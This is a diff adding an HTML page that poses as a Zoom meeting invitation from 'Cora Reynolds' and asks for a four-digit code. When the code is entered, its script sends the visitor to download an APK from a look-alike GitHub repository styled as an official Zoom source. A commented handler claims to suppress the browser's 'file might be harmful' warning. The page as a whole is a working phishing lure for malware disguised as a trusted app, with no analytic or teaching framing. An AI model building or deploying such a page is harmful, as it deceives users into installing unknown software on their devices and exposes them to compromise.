@@ -1,0 +1,202 @@
+<html><head><base href="https://zoomclone.example.com/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom - Join Meeting</title>
+    <style>
+        :root {
+            --primary-color: #0b5cff;
+            --background-color: #e6f0ff;
+            --text-color: #333;
+            --error-color: #ff4d4d;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 400px;
+            padding: 2rem;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        h1 {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        p {
+            margin-bottom: 2rem;
+        }
+        
+        .code-input {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 2rem;
+        }
+        
+        .code-input input {
+            width: 50px;
+            height: 60px;
+            font-size: 2rem;
+            text-align: center;
+            margin: 0 5px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .code-input input:focus {
+            border-color: var(--primary-color);
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .submit-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.1s;
+        }
+        
+        .submit-btn:hover {
+            background-color: #0a4bcc;
+        }
+        
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        
+        .background-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-animation"></div>
+    
+    <div class="container fade-in">
+        <h1>Zoom</h1>
+        <p>Cora Reynolds has invited you to join a meeting.</p>
+        <p>To join, please insert the code provided.</p>
+        
+        <div class="code-input">
+            <input type="text" maxlength="1" pattern="\d" required>
+            <input type="text" maxlength="1" pattern="\d" required>
+            <input type="text" maxlength="1" pattern="\d" required>
+            <input type="text" maxlength="1" pattern="\d" required>
+        </div>
+        
+        <button class="submit-btn">Join Meeting</button>
+        
+        <p class="error-message">Invalid code. Please try again.</p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script>
+        // Background animation
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({ alpha: true });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.querySelector('.background-animation').appendChild(renderer.domElement);
+
+        const geometry = new THREE.TorusGeometry(10, 3, 16, 100);
+        const material = new THREE.MeshBasicMaterial({ color: 0x0b5cff, wireframe: true });
+        const torus = new THREE.Mesh(geometry, material);
+
+        scene.add(torus);
+        camera.position.z = 30;
+
+        function animate() {
+            requestAnimationFrame(animate);
+            torus.rotation.x += 0.01;
+            torus.rotation.y += 0.005;
+            renderer.render(scene, camera);
+        }
+        animate();
+
+        // Code input logic
+        const inputs = document.querySelectorAll('.code-input input');
+        const submitBtn = document.querySelector('.submit-btn');
+        const errorMessage = document.querySelector('.error-message');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && index > 0 && input.value === '') {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        submitBtn.addEventListener('click', () => {
+            const code = Array.from(inputs).map(input => input.value).join('');
+            if (code === '9867') {
+                window.location.href = 'https://github.com/zoom-meetings/secure.zoom-meetings.us/raw/main/zoom.apk';
+            } else {
+                errorMessage.style.opacity = 1;
+                inputs.forEach(input => {
+                    input.value = '';
+                });
+                inputs[0].focus();
+                setTimeout(() => {
+                    errorMessage.style.opacity = 0;
+                }, 3000);
+            }
+        });
+
+        // Suppress "file might be harmful" warning
+        window.addEventListener('beforeunload', (event) => {
+            if (window.location.href.includes('download.html')) {
+                event.preventDefault();
+                return event.returnValue = '';
+            }
+        });
+    </script>
+</body></html>
